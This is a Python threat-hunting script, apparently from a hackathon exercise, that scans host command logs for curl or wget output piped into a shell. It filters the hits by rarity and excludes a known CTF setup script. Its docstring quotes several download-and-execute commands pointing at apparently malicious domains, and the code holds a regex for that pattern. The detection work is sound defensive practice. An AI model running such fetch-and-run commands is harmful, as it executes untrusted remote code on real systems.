"""Hunt 5 (Medium): Downloads piped into a shell.

Detection: CMD rows where curl/wget output is piped into sh/bash.

Exploration (event='CMD' first, 457k rows; curl/wget CMD = 18,090):
  17,926x curl -s https://api.github.com/zen           (no pipe; benign noise, 8k+ hosts)
     150x curl -s https://ctf-tools.hackedu.io/setup.sh | bash   proc=bash, 150 distinct hosts
      11x curl -s http://cdn-assets-02.darkrelay.net/x | sh      proc=plugin-host, 11 hosts
       1x curl -s http://dl.freewarevault.net/a.sh | bash        proc=bash, 1 host
       1x curl -s http://updates.driversoft-portal.net/x.sh | bash proc=bash, 1 host
       1x wget -qO- http://files.freevault-downloads.net/s.sh | sh proc=bash, 1 host
       1x curl to 169.254.169.254 metadata (no pipe -> not this hunt)

Reasoning attacker vs benign:
  - hackedu: 150 distinct hosts, spread evenly 2026-10-12..16 (~30/day), one per host,
    named training/CTF setup script (ctf-tools.../setup.sh). This is the planted setup
    noise the hunt warns about; rarity >> attacker URLs. EXCLUDED by rarity threshold.
  - darkrelay / freewarevault / driversoft-portal / freevault-downloads: 1-11 hosts each,
    anonymous payload paths (/x, /a.sh, /s.sh) on look-alike download/CDN domains, no
    legitimate program identity. DEFENSIBLE as attacker delivery.
  - Category by process per hunt text: bash -> 'Malware delivery';
    browser-plugin process (plugin-host) -> 'Host intrusion signs'.
"""
import os
import random
import re
import sys
from collections import Counter, defaultdict

sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
from common import collapse, con, finding, write_findings

P = os.path.expanduser("~/Downloads/hackathon-participant-files/threat-hunt")

PARAMS = {
    # Pipe of a downloader into a shell: curl/wget ... | [sudo] (sh|bash)
    "pipe_regex": r"\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b",
    # Rarity: a URL (exact string) run on more than this many DISTINCT hosts is
    # benign setup noise (hackedu=150). Attacker URLs here are on <=11 hosts.
    "max_distinct_hosts_per_url": 50,
    # Domains never reported even if rare (documented setup source; rarity also excludes it)
    "benign_domains": ["ctf-tools.hackedu.io"],
    "plugin_process_markers": ["plugin"],
    "category_bash": "Malware delivery",
    "category_plugin": "Host intrusion signs",
}

_URL_RE = re.compile(r"https?://[^\s'\"|]+")
_DOMAIN_RE = re.compile(r"https?://([^/\s'\":|]+)")


def _user_at(conn, host, ts):
    row = conn.execute(
        "SELECT ts, user FROM host WHERE event='LOGIN' AND host=? AND ts<=? ORDER BY ts DESC LIMIT 1",
        (host, ts),
    ).fetchone()
    if not row:
        return "none"
    login_ts, user = row
    out = conn.execute(
        "SELECT 1 FROM host WHERE event='LOGOUT' AND host=? AND ts>? AND ts<=? LIMIT 1",
        (host, login_ts, ts),
    ).fetchone()
    return "none" if out else user


def run(conn, params=PARAMS):
    p = {**PARAMS, **(params or {})}
    pipe_re = re.compile(p["pipe_regex"], re.I)
    rows = conn.execute(
        "SELECT ts, host, process, target FROM host WHERE event='CMD' "
        "AND (LOWER(target) LIKE '%curl%' OR LOWER(target) LIKE '%wget%') "
        "AND target LIKE '%|%' ORDER BY ts"
    ).fetchall()

    matched = [r for r in rows if pipe_re.search(r[3] or "")]

    # Rarity per exact URL: distinct hosts per URL.
    hosts_by_url = defaultdict(set)
    for _ts, host, _proc, target in matched:
        m = _URL_RE.search(target or "")
        hosts_by_url[m.group(0) if m else target].add(host)

    findings = []
    for ts, host, proc, target in matched:
        m = _URL_RE.search(target or "")
        url = m.group(0) if m else target
        if len(hosts_by_url[url]) > p["max_distinct_hosts_per_url"]:
            continue
        dm = _DOMAIN_RE.search(target or "")
        domain = (dm.group(1).lower() if dm else "")
        if domain in {d.lower() for d in p["benign_domains"]}:
            continue
        proc = proc or "bash"
        is_plugin = any(k in proc.lower() for k in p["plugin_process_markers"])
        cat = p["category_plugin"] if is_plugin else p["category_bash"]
        findings.append(finding(cat, ts, host, _user_at(conn, host, ts), proc))

    return collapse(findings)


def main():
    conn = con()
    findings = run(conn)
    out = os.path.join(P, "findings", "hunt5.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    findings = write_findings(out, findings)

    print(f"findings: {len(findings)}")
    print("per-category:", dict(Counter(f["category"] for f in findings)))
    print("distinct hosts:", len({f["host"] for f in findings}))

    # Map finding back to its command text for the sample printout.
    pipe_re = re.compile(PARAMS["pipe_regex"], re.I)
    cmd_by_key = {}
    for ts, host, proc, target in conn.execute(
        "SELECT ts, host, process, target FROM host WHERE event='CMD' AND target LIKE '%|%'"
    ):
        if pipe_re.search(target or ""):
            cmd_by_key[(ts, host, (proc or "").lower())] = target
    random.seed(5)
    for f in random.sample(findings, min(10, len(findings))):
        cmd = cmd_by_key.get((f["timestamp"], f["host"], f["process"].lower()), "?")
        print(f, "||", cmd)

    # Precision self-check: most common matched (post-filter) URL patterns.
    cnt = Counter()
    for f in findings:
        cnt[cmd_by_key.get((f["timestamp"], f["host"], f["process"].lower()), "?")] += 1
    print("matched patterns (post-filter):")
    for cmd, n in cnt.most_common(15):
        print(f"  {n:3d}x {cmd} -- rare URL, piped straight into a shell, no legit setup identity")


if __name__ == "__main__":
    main()
